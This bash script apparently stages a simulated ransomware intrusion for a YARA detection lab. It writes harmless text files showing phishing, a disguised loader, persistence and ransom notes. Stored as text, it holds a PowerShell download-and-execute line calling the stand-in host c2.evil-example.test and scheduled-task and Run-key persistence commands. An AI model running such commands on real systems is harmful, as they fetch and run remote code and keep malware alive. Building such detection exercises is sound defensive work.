#!/bin/bash
# Simulated attack. Writes harmless text files only; reports each stage to the dashboard.
LAB=~/yara-lab
cd "$LAB/fileserver" || exit 1
ev() { echo "$1" >> "$LAB/.events.log"; }
echo "[ATTACK SIMULATION - writes harmless text files only]"

echo "[1] Phishing: victim opens Invoice_Oct2026.pdf.exe"; ev 1; sleep 1.5
printf 'MZ\x90\x00' > mail_attachments/Invoice_Oct2026.pdf.exe
echo " SIMULATED LOADER EVIL_LOADER_v1 beacon to c2.evil-example.test" >> mail_attachments/Invoice_Oct2026.pdf.exe

echo "[2] Evasion: loader copied and disguised as a photo"; ev 2; sleep 1.5
cp mail_attachments/Invoice_Oct2026.pdf.exe users/john/Downloads/holiday_photo.jpg

echo "[3] Download and execute second stage via PowerShell"; ev 3; sleep 1.5
cat > users/john/AppData/update.ps1 << 'EOT'
# SIMULATED - harmless text
$wc = New-Object Net.WebClient
$code = $wc.DownloadString("http://c2.evil-example.test/stage2.txt")
Invoke-Expression $code
EOT

echo "[4] Persistence: scheduled task + Run key"; ev 4; sleep 1.5
cat > users/john/AppData/persistence.ps1 << 'EOT'
# SIMULATED - harmless text
schtasks /create /tn "WindowsUpdateCheck" /tr "C:\Users\john\update.ps1" /sc onlogon
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /d "C:\Users\john\update.ps1"
EOT

echo "[5] Impact: ransom notes dropped"; ev 5; sleep 1.5
for d in finance hr; do
cat > $d/README_DECRYPT.txt << 'EOT'
SIMULATED RANSOM NOTE (demo, nothing is encrypted)
Your files have been encrypted. To decrypt them, send 0.5 bitcoin to wallet 1FAKEdemoWALLETaddress.
EOT
done

echo "[6] Attacker recompiles: variant with a different hash"; ev 6; sleep 1.5
cp mail_attachments/Invoice_Oct2026.pdf.exe shared/Invoice_v2.exe
echo " extra padding bytes" >> shared/Invoice_v2.exe
echo "[DONE] Attack simulated. File server is now compromised."
